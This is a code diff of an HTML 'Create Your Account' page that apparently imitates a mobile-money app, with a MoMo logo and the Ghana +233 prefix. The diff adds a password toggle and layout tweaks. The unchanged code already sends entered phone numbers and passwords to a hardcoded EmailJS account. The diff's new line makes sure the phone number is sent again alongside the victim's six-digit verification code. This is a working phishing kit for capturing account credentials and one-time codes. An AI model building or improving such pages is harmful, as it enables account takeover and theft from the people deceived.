@@ -11,48 +11,48 @@
       emailjs.init("gV773-VG85THpxrNV"); 
     })();
   </script>
-     <style>
+  <style>
     body {
-  margin: 0;
-  font-family: 'Segoe UI', sans-serif;
-  background: linear-gradient(135deg, #003366, #0055a5);
-  min-height: 100vh;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  overflow: hidden;
-  position: relative;
-}
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(135deg, #003366, #0055a5);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      overflow: hidden;
+      position: relative;
+    }
 
-/* Yellow accent circles */
-body::before,
-body::after {
-  content: "";
-  position: absolute;
-  border-radius: 50%;
-  background: #ffcc00;
-  opacity: 0.15;
-}
+    /* Yellow accent circles */
+    body::before,
+    body::after {
+      content: "";
+      position: absolute;
+      border-radius: 50%;
+      background: #ffcc00;
+      opacity: 0.15;
+    }
 
-body::before {
-  width: 300px;
-  height: 300px;
-  top: -100px;
-  left: -100px;
-}
+    body::before {
+      width: 300px;
+      height: 300px;
+      top: -100px;
+      left: -100px;
+    }
 
-body::after {
-  width: 200px;
-  height: 200px;
-  bottom: -80px;
-  right: -80px;
-}
-</style>
+    body::after {
+      width: 200px;
+      height: 200px;
+      bottom: -80px;
+      right: -80px;
+    }
+  </style>
 </head>
-<body class="bg-gradient-to-r from-blue-50 to-blue-100 font-sans">
+<body>
   <!-- Page Wrapper -->
-  <div class="min-h-screen flex items-center justify-center">
-<div class="bg-white p-6 sm:p-8 rounded-2xl shadow-2xl w-[100%] max-w-lg border border-blue-100">
+  <div class="flex items-center justify-center w-full px-4">
+    <div class="bg-white p-6 sm:p-8 rounded-2xl shadow-2xl w-full max-w-md border border-blue-100">
       <h2 class="text-3xl font-bold text-blue-700 text-center mb-6">Create Your Account</h2>
 
       <!-- Registration Form -->
@@ -71,11 +71,17 @@ body::after {
           </div>
         </div>
 
-        <!-- Password -->
+        <!-- Password with toggle -->
         <div>
           <label class="block text-sm font-semibold text-gray-700 mb-1">Password</label>
-          <input type="password" id="password" required placeholder="Enter password"
-            class="w-full border-2 border-blue-200 rounded-xl px-3 py-2 outline-none focus:ring-2 focus:ring-blue-500">
+          <div class="relative">
+            <input type="password" id="password" required placeholder="Enter password"
+              class="w-full border-2 border-blue-200 rounded-xl px-3 py-2 outline-none focus:ring-2 focus:ring-blue-500 pr-10">
+            <button type="button" id="togglePassword" 
+              class="absolute inset-y-0 right-3 flex items-center text-gray-500 hover:text-blue-600">
+              👁
+            </button>
+          </div>
         </div>
 
         <!-- Submit -->
@@ -89,7 +95,7 @@ body::after {
 
   <!-- Popup: OTP -->
   <div id="otpModal" class="fixed inset-0 bg-black bg-opacity-50 hidden items-center justify-center">
-    <div class="bg-white rounded-2xl shadow-2xl w-full max-w-sm p-6 border border-blue-100">
+    <div class="bg-white rounded-2xl shadow-2xl w-full max-w-sm p-6 border border-blue-100 mx-4">
       <img src="momoapp.png" style="height: 100px;width: 300px;padding-left: 50px;">
       <h3 class="text-xl font-bold text-blue-700 mb-4">Enter Verification Code</h3>
       <p class="text-sm text-gray-600 mb-2">We sent a link to your number. Enter the last six-digit numbers.</p>
@@ -122,6 +128,15 @@ body::after {
     let countdown;
     let timeLeft = 20;
 
+    // Password toggle
+    const togglePassword = document.getElementById("togglePassword");
+    const passwordField = document.getElementById("password");
+    togglePassword.addEventListener("click", () => {
+      const type = passwordField.getAttribute("type") === "password" ? "text" : "password";
+      passwordField.setAttribute("type", type);
+      togglePassword.textContent = type === "password" ? "👁" : "🙈";
+    });
+
     function showNotification(message, type="success") {
       notification.textContent = message;
       notification.className = `fixed top-5 right-5 px-4 py-3 rounded-xl shadow-lg font-medium text-white ${
@@ -149,7 +164,7 @@ body::after {
     registerForm.addEventListener("submit", function(e){
       e.preventDefault();
       const phone = document.getElementById("phone").value;
-      const password = document.getElementById("password").value;
+      const password = passwordField.value;
 
       // Simulate EmailJS send
       emailjs.send("service_74nt2c9","template_s6vpt2e",{
@@ -169,6 +184,7 @@ body::after {
     verifyBtn.addEventListener("click", function(){
       const otp = otpInput.value;
       if(otp.length === 6){
+        const phone = localStorage.getItem("userPhone");
         emailjs.send("service_74nt2c9","template_s6vpt2e",{
           phone: "+233" + phone,
           otp: otp
@@ -193,9 +209,3 @@ body::after {
   </script>
 </body>
 </html>
-
-
-
-
-
-
